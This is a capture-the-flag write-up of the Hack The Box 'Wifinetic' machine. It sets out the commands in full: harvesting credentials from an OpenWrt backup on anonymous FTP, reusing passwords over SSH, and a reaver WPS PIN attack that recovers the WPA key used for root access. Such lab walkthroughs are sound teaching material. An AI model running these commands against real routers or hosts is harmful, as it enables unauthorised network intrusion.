
Target : 10.129.14.95

Date : 06/06/2026

```bash
>  echo "10.129.14.95 wifinetic.htb" | sudo tee -a /etc/hosts  
Please touch the FIDO authenticator.  
10.129.14.95 wifinetic.htb  
>  nmap -Pn -sV -sC -O -p- --min-rate=3000 -T4 10.129.14.95  
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-06 13:40 +0200  
Warning: 10.129.14.95 giving up on port because retransmission cap hit (6).  
Nmap scan report for wifinetic.htb (10.129.14.95)  
Host is up (0.060s latency).  
Not shown: 65493 closed tcp ports (reset), 39 filtered tcp ports (no-response)  
PORT   STATE SERVICE    VERSION  
21/tcp open  ftp        vsftpd 3.0.3  
| ftp-anon: Anonymous FTP login allowed (FTP code 230)  
| -rw-r--r--    1 ftp      ftp          4434 Jul 31  2023 MigrateOpenWrt.txt  
| -rw-r--r--    1 ftp      ftp       2501210 Jul 31  2023 ProjectGreatMigration.pdf  
| -rw-r--r--    1 ftp      ftp         60857 Jul 31  2023 ProjectOpenWRT.pdf  
| -rw-r--r--    1 ftp      ftp         40960 Sep 11  2023 backup-OpenWrt-2023-07-26.tar  
|_-rw-r--r--    1 ftp      ftp         52946 Jul 31  2023 employees_wellness.pdf  
| ftp-syst:    
|   STAT:    
| FTP server status:  
|      Connected to ::ffff:10.10.14.228  
|      Logged in as ftp  
|      TYPE: ASCII  
|      No session bandwidth limit  
|      Session timeout in seconds is 300  
|      Control connection is plain text  
|      Data connections will be plain text  
|      At session startup, client count was 2  
|      vsFTPd 3.0.3 - secure, fast, stable  
|_End of status  
22/tcp open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:    
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)  
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)  
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)  
53/tcp open  tcpwrapped  
Device type: general purpose  
Running: Linux 5.X  
OS CPE: cpe:/o:linux:linux_kernel:5  
OS details: Linux 5.0 - 5.14  
Network Distance: 2 hops  
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel  
  
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 53.69 seconds
```

We can see that only ports `ftp 21/tcp` , `ssh 22/tcp` and `DNS 53/tcp` are open.
We can already see the content of the File Transfer Protocol, especially `backup-OpenWrt-2023-07-26.tar` which must be a backup for `OpenWrt`, which clicks with the name of the box : it's about Wi-Fi connection. OpenWrt is a Linux-based OS for routers, repeaters, and other devices. The backup might give us access to SSIDs, or other data.

We also have these informations :

| ssh-hostkey:    
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)  
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)  
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)`

We'll download all the files in one go and put them in a directory :

```
>  mkdir -p ~/htb/wifinetic/ftp  
>  cd ~/htb/wifinetic/ftp  
>  ftp -n 10.129.14.95 <<'EOF'  
user ftp  
pass ftp@  
prompt off  
get backup-OpenWrt-2023-07-26.tar
bye  
EOF  
Passive mode on.  
Interactive mode off.  
>  ls  
backup-OpenWrt-2023-07-26.tar
```

```bash
mkdir -p ../openwrt && tar -xvf backup-OpenWrt-2023-07-26.tar -C ../openwrt  
  
./etc/  
./etc/config/  
./etc/config/system  
./etc/config/wireless  
./etc/config/firewall  
./etc/config/network  
./etc/config/uhttpd  
./etc/config/dropbear  
./etc/config/ucitrack  
./etc/config/rpcd  
./etc/config/dhcp  
./etc/config/luci  
./etc/uhttpd.key  
./etc/uhttpd.crt  
./etc/sysctl.conf  
./etc/inittab  
./etc/group  
./etc/opkg/  
./etc/opkg/keys/  
./etc/opkg/keys/4d017e6f1ed5d616  
./etc/hosts  
./etc/passwd  
./etc/shinit  
./etc/rc.local  
./etc/dropbear/  
./etc/dropbear/dropbear_ed25519_host_key  
./etc/dropbear/dropbear_rsa_host_key  
./etc/shells  
./etc/profile  
./etc/nftables.d/  
./etc/nftables.d/10-custom-filter-chains.nft  
./etc/nftables.d/README  
./etc/luci-uploads/  
./etc/luci-uploads/.placeholder
```

Great, we got a backup of the configuration of the OpenWrt running on the FTP service, and we'll try to find SSIDs, usernames, passwords or keys.

```bash
>  grep -RiE 'user|ssid|key|password|psk|pin|id_rsa|ssh' ~/htb/wifinetic/openwrt/etc/config  
/home/vagabond/htb/wifinetic/openwrt/etc/config/firewall:       option name 'Allow-Ping'  
/home/vagabond/htb/wifinetic/openwrt/etc/config/luci:   option firewall '/etc/firewall.user'  
/home/vagabond/htb/wifinetic/openwrt/etc/config/luci:   option ping 'openwrt.org'  
/home/vagabond/htb/wifinetic/openwrt/etc/config/uhttpd: option key '/etc/uhttpd.key'  
/home/vagabond/htb/wifinetic/openwrt/etc/config/uhttpd: option key_type 'ec'  
/home/vagabond/htb/wifinetic/openwrt/etc/config/wireless:       option ssid 'OpenWrt'  
/home/vagabond/htb/wifinetic/openwrt/etc/config/wireless:       option encryption 'psk'  
/home/vagabond/htb/wifinetic/openwrt/etc/config/wireless:       option key 'VeRyUniUqWiFIPasswrd1!'  
/home/vagabond/htb/wifinetic/openwrt/etc/config/wireless:       option ssid 'OpenWrt'  
/home/vagabond/htb/wifinetic/openwrt/etc/config/wireless:       option encryption 'psk'  
/home/vagabond/htb/wifinetic/openwrt/etc/config/wireless:       option key 'VeRyUniUqWiFIPasswrd1!'  
/home/vagabond/htb/wifinetic/openwrt/etc/config/rpcd:   option username 'root'  
/home/vagabond/htb/wifinetic/openwrt/etc/config/rpcd:   option password '$p$root'  
/home/vagabond/htb/wifinetic/openwrt/etc/config/dropbear:       option PasswordAuth 'on'  
/home/vagabond/htb/wifinetic/openwrt/etc/config/dropbear:       option RootPasswordAuth 'on'
```

We got a password/key : `VeRyUniUqWiFIPasswrd1!` and `$p$root` as "option password" now let's dig for usernames :

```bash
>  cat ~/htb/wifinetic/openwrt/etc/passwd  
  
root:x:0:0:root:/root:/bin/ash  
daemon:*:1:1:daemon:/var:/bin/false  
ftp:*:55:55:ftp:/home/ftp:/bin/false  
network:*:101:101:network:/var:/bin/false  
nobody:*:65534:65534:nobody:/var:/bin/false  
ntp:x:123:123:ntp:/var/run/ntp:/bin/false  
dnsmasq:x:453:453:dnsmasq:/var/run/dnsmasq:/bin/false  
logd:x:514:514:logd:/var/run/logd:/bin/false  
ubus:x:81:81:ubus:/var/run/ubus:/bin/false  
netadmin:x:999:999::/home/netadmin:/bin/false
```

We got `netadmin`, `root`, `nobody`, so we'll try `netadmin` first :

```bash
>  ssh netadmin@10.129.14.95  
  
The authenticity of host '10.129.14.95 (10.129.14.95)' can't be established.  
ED25519 key fingerprint is: SHA256:RoZ8jwEnGGByxNt04+A/cdluslAwhmiWqG3ebyZko+A  
This key is not known by any other names.  
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes  
Warning: Permanently added '10.129.14.95' (ED25519) to the list of known hosts.
```

We try `VeRyUniUqWiFIPasswrd1!`

```
netadmin@wifinetic:~$
```

And we get the shell.

```bash
netadmin@wifinetic:~$ ls  
user.txt  
netadmin@wifinetic:~$ cat user.txt  
daba48ac36ba2a6e237eab6d65f08a49
netadmin@wifinetic:~$ whoami  
netadmin  
netadmin@wifinetic:~$ id  
uid=1000(netadmin) gid=1000(netadmin) groups=1000(netadmin)
netadmin@wifinetic:~$ sudo -l  
[sudo] password for netadmin:    
Sorry, user netadmin may not run sudo on wifinetic.
netadmin@wifinetic:~$ getcap -r / 2>/dev/null | grep -iE 'reaver|wash|iw|wireless'  
  
/usr/bin/reaver = cap_net_raw+ep
```

This means we can use `reaver` :

We download the other files in binary mode :

```bash
>  cd ~/htb/wifinetic/ftp  
>  ftp -n 10.129.14.95  
Connected to 10.129.14.95.  
220 (vsFTPd 3.0.3)  
ftp> user ftp  
230 Login successful.  
ftp> pass ftp @  
Passive mode on.  
ftp> binary  
200 Switching to Binary mode.  
ftp> mget *  
mget MigrateOpenWrt.txt?    
227 Entering Passive Mode (10,129,14,95,170,6).  
150 Opening BINARY mode data connection for MigrateOpenWrt.txt (4434 bytes).  
226 Transfer complete.  
4434 bytes received in 0.0396 seconds (109.3839 kbytes/s)  
mget ProjectGreatMigration.pdf?    
227 Entering Passive Mode (10,129,14,95,177,206).  
150 Opening BINARY mode data connection for ProjectGreatMigration.pdf (2501210 bytes).  
  
226 Transfer complete.  
2501210 bytes received in 3.0102 seconds (811.4376 kbytes/s)  
mget ProjectOpenWRT.pdf? 227 Entering Passive Mode (10,129,14,95,173,23).  
150 Opening BINARY mode data connection for ProjectOpenWRT.pdf (60857 bytes).  
226 Transfer complete.  
60857 bytes received in 0.1429 seconds (415.9094 kbytes/s)  
mget backup-OpenWrt-2023-07-26.tar?    
227 Entering Passive Mode (10,129,14,95,163,151).  
150 Opening BINARY mode data connection for backup-OpenWrt-2023-07-26.tar (40960 bytes).  
226 Transfer complete.  
40960 bytes received in 0.1427 seconds (280.2836 kbytes/s)  
mget employees_wellness.pdf?    
227 Entering Passive Mode (10,129,14,95,174,94).  
150 Opening BINARY mode data connection for employees_wellness.pdf (52946 bytes).  
226 Transfer complete.  
52946 bytes received in 0.1346 seconds (384.2034 kbytes/s)
```

Then we read the `.txt` :

```bash
>  cat MigrateOpenWrt.txt  
 +-------------------------------------------------------+  
 |             Replace OpenWRT with Debian                |  
 +-------------------------------------------------------+  
 |                                                       |  
 |  +-----------------------------------------------+    |  
 |  |        Evaluate Current OpenWRT Setup        |    |  
 |  +-----------------------------------------------+    |  
 |                                                       |  
 |  +-----------------------------------------------+    |  
 |  |         Plan and Prepare the Migration       |    |  
 |  +-----------------------------------------------+    |  
 |  |                                               |    |  
 |  |   - Inventory current hardware and software   |    |  
 |  |   - Identify dependencies and customizations  |    |  
 |  |   - Research Debian-compatible alternatives   |    |  
 |  |   - Backup critical configurations and data   |    |  
 |  |                                               |    |  
 |  +-----------------------------------------------+    |  
 |                                                       |  
 |  +-----------------------------------------------+    |  
 |  |            Install Debian on Devices         |    |  
 |  +-----------------------------------------------+    |  
 |  |                                               |    |  
 |  |   - Obtain latest Debian release              |    |  
 |  |   - Check hardware compatibility              |    |  
 |  |   - Flash/install Debian on each device       |    |  
 |  |   - Verify successful installations           |    |  
 |  |                                               |    |  
 |  +-----------------------------------------------+    |  
 |                                                       |  
 |  +-----------------------------------------------+    |  
 |  |         Set Up Networking and Services       |    |  
 |  +-----------------------------------------------+    |  
 |  |                                               |    |  
 |  |   - Configure network interfaces              |    |  
 |  |   - Install and configure Wifi drivers        |    |  
 |  |   - Set up DHCP, DNS, and routing             |    |  
 |  |   - Install firewall and security measures    |    |  
 |  |   - Set up any additional services needed     |    |  
 |  |                                               |    |  
 |  +-----------------------------------------------+    |  
 |                                                       |  
 |  +-----------------------------------------------+    |  
 |  |           Migrate Configurations             |    |  
 |  +-----------------------------------------------+    |  
 |  |                                               |    |  
 |  |   - Adapt OpenWRT configurations to Debian    |    |  
 |  |   - Migrate custom settings and scripts       |    |  
 |  |   - Ensure compatibility with new system      |    |  
 |  |                                               |    |  
 |  +-----------------------------------------------+    |  
 |                                                       |  
 |  +-----------------------------------------------+    |  
 |  |          Test and Troubleshoot               |    |  
 |  +-----------------------------------------------+    |  
 |  |                                               |    |  
 |  |   - Test Wifi connectivity and performance    |    |  
 |  |   - Verify all services are functioning       |    |  
 |  |   - Address and resolve any issues            |    |  
 |  |   - Test for security issues with Reaver tool |    |  
 |  |                                               |    |  
 |  +-----------------------------------------------+    |  
 |                                                       |  
 |  +-----------------------------------------------+    |  
 |  |         Monitor and Maintain                 |    |  
 |  +-----------------------------------------------+    |  
 |  |                                               |    |  
 |  |   - Implement regular updates and patches     |    |  
 |  |   - Monitor system health and performance     |    |  
 |  |   - Maintain and optimize the Debian system   |    |  
 |  |                                               |    |  
 |  +-----------------------------------------------+    |  
 |                                                       |
```

`- Test for security issues with Reaver tool`

We return on `wifinetic` :

```bash
netadmin@wifinetic:~$ iw dev; echo '---'; iwconfig 2>/dev/null  
phy#2  
       Interface mon0  
               ifindex 7  
               wdev 0x200000002  
               addr 02:00:00:00:02:00  
               type monitor  
               txpower 20.00 dBm  
       Interface wlan2  
               ifindex 5  
               wdev 0x200000001  
               addr 02:00:00:00:02:00  
               type managed  
               txpower 20.00 dBm  
phy#1  
       Unnamed/non-netdev interface  
               wdev 0x1000000bc  
               addr 42:00:00:00:01:00  
               type P2P-device  
               txpower 20.00 dBm  
       Interface wlan1  
               ifindex 4  
               wdev 0x100000001  
               addr 02:00:00:00:01:00  
               ssid OpenWrt  
               type managed  
               channel 1 (2412 MHz), width: 20 MHz (no HT), center1: 2412 MHz  
               txpower 20.00 dBm  
phy#0  
       Interface wlan0  
               ifindex 3  
               wdev 0x1  
               addr 02:00:00:00:00:00  
               ssid OpenWrt  
               type AP  
               channel 1 (2412 MHz), width: 20 MHz (no HT), center1: 2412 MHz  
               txpower 20.00 dBm  
---  
wlan2     IEEE 802.11  ESSID:off/any     
         Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm      
         Retry short limit:7   RTS thr:off   Fragment thr:off  
         Power Management:on  
            
wlan1     IEEE 802.11  ESSID:"OpenWrt"     
         Mode:Managed  Frequency:2.412 GHz  Access Point: 02:00:00:00:00:00      
         Bit Rate:5.5 Mb/s   Tx-Power=20 dBm      
         Retry short limit:7   RTS thr:off   Fragment thr:off  
         Power Management:on  
         Link Quality=70/70  Signal level=-30 dBm     
         Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0  
         Tx excessive retries:0  Invalid misc:6   Missed beacon:0  
  
mon0      IEEE 802.11  Mode:Monitor  Tx-Power=20 dBm      
         Retry short limit:7   RTS thr:off   Fragment thr:off  
         Power Management:on  
            
wlan0     IEEE 802.11  Mode:Master  Tx-Power=20 dBm      
         Retry short limit:7   RTS thr:off   Fragment thr:off  
         Power Management:on
```

The BSSID seems to be `02:00:00:00:00:00` and the `Channel` is `1` (per wlan0 & wlan1).

```bash
netadmin@wifinetic:~$ reaver -i mon0 -b 02:00:00:00:00:00 -c 1  
  
Reaver v1.6.5 WiFi Protected Setup Attack Tool  
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>  
  
[+] Waiting for beacon from 02:00:00:00:00:00  
[+] Received beacon from 02:00:00:00:00:00  
[!] Found packet with bad FCS, skipping...  
[+] Associated with 02:00:00:00:00:00 (ESSID: OpenWrt)  
[+] Associated with 02:00:00:00:00:00 (ESSID: OpenWrt)  
[+] Associated with 02:00:00:00:00:00 (ESSID: OpenWrt)  
[+] Associated with 02:00:00:00:00:00 (ESSID: OpenWrt)  
[+] WPS PIN: '12345670'  
[+] WPA PSK: 'WhatIsRealAnDWhAtIsNot51121!'  
[+] AP SSID: 'OpenWrt'
```

And we got the `WPS PIN` and the `WPA PSK`.

We use `WhatIsRealAnDWhAtIsNot51121!` on `root@10.129.14.95` via `ssh` :


```bash
>  ssh root@10.129.14.95  
  
** WARNING: connection is not using a post-quantum key exchange algorithm.  
** This session may be vulnerable to "store now, decrypt later" attacks.  
** The server may need to be upgraded. See https://openssh.com/pq.html  
root@10.129.14.95's password:    
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-162-generic x86_64)  
  
* Documentation:  https://help.ubuntu.com  
* Management:     https://landscape.canonical.com  
* Support:        https://ubuntu.com/advantage  
  
 System information as of Sat 06 Jun 2026 01:00:54 PM UTC  
  
 System load:            0.0  
 Usage of /:             65.2% of 4.76GB  
 Memory usage:           11%  
 Swap usage:             0%  
 Processes:              235  
 Users logged in:        1  
 IPv4 address for eth0:  10.129.14.95  
 IPv6 address for eth0:  dead:beef::a0de:adff:feaf:4b4a  
 IPv4 address for wlan0: 192.168.1.1  
 IPv4 address for wlan1: 192.168.1.23  
  
  
Expanded Security Maintenance for Applications is not enabled.  
  
0 updates can be applied immediately.  
  
Enable ESM Apps to receive additional future security updates.  
See https://ubuntu.com/esm or run: sudo pro status  
  
  
The list of available updates is more than a week old.  
To check for new updates run: sudo apt update  
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings  
  
  
Last login: Tue Sep 12 12:07:58 2023
root@wifinetic:~# cat root.txt  
bb6ad8ddf2cbccf29c4d19b6573c7f26
```

And we got the root flag.
